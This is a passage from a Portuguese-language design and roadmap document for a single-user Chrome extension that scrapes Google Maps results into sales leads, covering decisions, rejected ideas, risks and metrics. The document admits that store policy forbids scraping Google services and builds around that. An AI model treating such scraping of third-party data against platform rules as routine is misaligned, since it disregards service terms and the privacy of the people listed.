| **Gravar o lead antes de enriquecer** | F5 no meio da coleta não pode custar nada |
| **Nunca chutar índice do payload** | Um índice errado produz dado plausível e falso — pior que campo vazio |
| **Sanitizar na exportação, nunca no dado armazenado** | `accessorDownload` neutraliza fórmula só no CSV/XLSX; a tela e a base local mantêm o valor original. Sanitizar na entrada destruiria dado legítimo (ex. nome de empresa começando com número negativo) |
| **Bloquear por IP/host literal, não por resolução de DNS** | `isPublicHttpUrl` barra loopback e RFC 1918 escritos diretamente na URL. Não resolve DNS rebinding — o custo de um proxy próprio não se justifica pelo risco residual numa ferramenta de usuário único |
| **Score de oportunidade computável sem esperar o enriquecimento** | `no_real_website`/`website_is_social_profile` leem só `lead.website` do payload cru — não dependem de `lead.instagram` (que só existe depois do fetch). Uma regra que só pode disparar depois de um evento que ela mesma impede de acontecer é regra morta; o teste de ponta a ponta pegou isso antes de ir para produção |
| **Cada linha do painel tem seu próprio elemento de texto** | Contagem vitalícia, aviso de esquema, status de sessão e progresso de enriquecimento nunca dividem o mesmo nó — dividir significa um dos quatro apagar o outro no próximo tick |
| **Campanha pausa em vez de adivinhar quando a URL não bate** | `shouldAutoResumeCampaign` exige igualdade exata entre o texto da busca pendente e o que está na URL da página. Se o Google reescrever a URL de um jeito não reconhecido, a campanha para e espera o usuário — nunca tenta "aproximar" ou seguir adiante sobre uma suposição |
| **Estado de campanha só em storage.local, nunca em variável do content script** | Cada busca da campanha navega a aba para uma URL nova, o que recarrega a página inteira e mata qualquer estado só-em-memória. A máquina de estado (`src/shared/campaign.js`) é pura e serializável de propósito |
| **Só a estratégia "por região" ganhou UI** | `buildCoordinateGrid` (grid por raio/coordenada) existe e está testado, mas fica só programático por ora — um campo de raio+passo em km não cabia bem num popup de ~320px sem prejudicar o caso comum (lista de bairros) |

---

## 8. O que foi deliberadamente rejeitado

Tão importante quanto o roadmap: o que **não** fazer, e por quê.

| Rejeitado | Motivo |
|---|---|
| **Virar SaaS** | O valor está em ser local: sem servidor, sem custo marginal, sem responsabilidade de guardar dado de terceiros. Um backend transformaria uma ferramenta em um passivo de LGPD |
| **Publicar na Chrome Web Store** | A política proíbe extensões de scraping de serviços do Google. A revisão derruba, e a conta corre risco |
| **Dashboards com gráficos** | ECharts estava no projeto sem uso — por isso foi removido. Gráfico em ferramenta de prospecção é distração; a métrica que importa é quantas ligações saíram |
| **IA no caminho crítico** (parse, dedupe, classificação de telefone) | Decisões determinísticas onde o erro do LLM é silencioso e caro |
| **CI/CD com GitHub Actions** | Desproporcional para um binário local de usuário único. `pre-commit` cobre o mesmo risco |
| **Migrar para TypeScript** | Traria build step (§3.3) para ganhar tipagem num projeto de ~1.200 linhas já coberto por 50 testes. Reavaliar se passar de ~5.000 linhas |
| **Otimizar performance de JS** | O gargalo é rede, não CPU. Micro-otimização aqui é ruído |
| **Suporte a mobile** | Chrome desktop não tem extensões no Android; reescrever como app é outro projeto |

---

## 9. Riscos e contingências

| Risco | Probabilidade | Impacto | Contingência |
|---|---|---|---|
| Google reordena o payload | **Alta** (questão de tempo) | Alto | Canário (1.1) avisa na hora; `payload-map.md` (1.2) encurta o remapeamento para minutos |
| Google migra `/search` para outro endpoint | Média | Crítico | O interceptor loga toda URL capturada; achar o novo endpoint é questão de inspecionar o console |
| Classes ofuscadas mudam (`.w6VYqd`, `.HlvSq`) | Alta | Baixo/Médio | Painel já tem fallback; a detecção de fim de lista degrada para a trava de rolagem |
| CAPTCHA por volume | Média (sobe muito com 3.1) | Médio | Pausa configurável, detecção de CAPTCHA com parada imediata |
| Base cresce além do suportado | Média | Médio | Gatilhos definidos em 4.2 |
| Extensão quebra numa atualização do Chrome (MV3) | Baixa | Alto | Sem APIs exóticas; a superfície usada (`storage`, `scripting`, content scripts) é estável |

---

## 10. Métricas de sucesso

O projeto não tem usuários para medir — as métricas são operacionais.

| Métrica | Hoje | Meta pós-Bloco 3 |
|---|---|---|
| Leads únicos por campanha | ~120 (teto do Maps) | 1.000+ (grade) |
| Tempo até a primeira ligação útil | Manual, indefinido | < 5 min (ordenar por score, ligar) |
| % de leads com telefone válido em E.164 | Medir na primeira coleta real | > 85% |
| % de leads com e-mail | Medir | > 30% com deep search |
| Falha de parser detectada em | Nunca (silenciosa) | No mesmo lote |
| Tempo de coleta de 500 leads | Medir | −50% com cache (4.1) |

**Primeira ação recomendada:** rodar uma coleta real e anotar os números da coluna "hoje".
Sem baseline, nenhuma otimização futura é justificável.

---

## 11. Manutenção deste documento

- Atualizar o cabeçalho (data + commit) a cada bloco concluído.
- Item concluído sai do roadmap e entra em **§4 (baseline)** com uma linha.
- Decisão nova de arquitetura entra em **§7**; ideia descartada entra em **§8** com a razão —
  é o que evita re-litigar a mesma discussão daqui a seis meses.
- Achado novo entra na tabela **§5** com localização no código antes de virar item de roadmap.
- Se um item ficar mais de dois blocos sem ser feito, provavelmente não importa: mover para §8
  ou excluir.

---

### Ordem de execução recomendada

```
Bloco 0  (1h15)  ✅ CONCLUÍDO 2026-07-29 — segurança 4,5 → 8,5
Bloco 1  (2h30)  ✅ CONCLUÍDO 2026-07-29 — canário de esquema, payload-map.md, pre-commit
Bloco 2  (7h)    ✅ CONCLUÍDO 2026-07-29 — score de oportunidade, campanhas, status de sessão
Bloco 3  (8h)    ⚠️  CÓDIGO PRONTO 2026-07-29 — falta validar em browser real antes de usar em volume
Bloco 4  (por gatilho, medindo antes)
Bloco 5  (quando os anteriores estiverem estáveis)
```

Cada bloco deixa o projeto num estado coerente e utilizável. Parar depois de qualquer um deles
é uma decisão legítima.

**Antes de usar o modo campanha em volume real:** carregue a extensão, crie uma campanha pequena
(2-3 regiões) pelo popup, e confirme que ela retoma sozinha, navega entre as buscas e conclui —
exatamente o critério de aceite do Bloco 3.1. Só depois disso vale confiar numa campanha grande.
